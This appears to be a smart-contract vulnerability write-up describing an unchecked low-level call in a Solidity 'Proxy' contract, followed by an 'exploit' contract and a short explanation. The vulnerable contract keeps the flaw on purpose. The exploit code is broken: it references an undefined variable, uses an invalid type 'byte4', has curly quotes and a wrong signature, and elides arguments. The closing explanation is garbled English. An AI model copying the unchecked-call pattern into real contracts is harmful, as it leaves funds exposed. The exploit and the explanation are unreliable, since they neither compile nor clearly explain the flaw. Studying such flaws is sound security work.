## Vulnerable Code

```javascript
contract Proxy  {
        modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
        function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
        function proxy(address target, bytes data) public payable {
            target.call.value(msg.value)(data);       //Vulnerable position

        }
    }
```



## Exploit Code

```javascript
Contract Attack{
    address victim;
    function setVictimAddress(address _address){
        victim = _address;
    }
    function startAttack(){
        victimAddress.call(byte4(keccak256(“Proxy(address, bytes)”)), this, ... );
        ...
    }
    function()payable{
        revert();
    }
}

```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position.Due to 'Unchecked Low level Call' so if an malicious contract -"Attack" to call mehtod-'proxy', as we looked that.the location of comment of vulnerability position is possible failed.but have not chacked the return value.
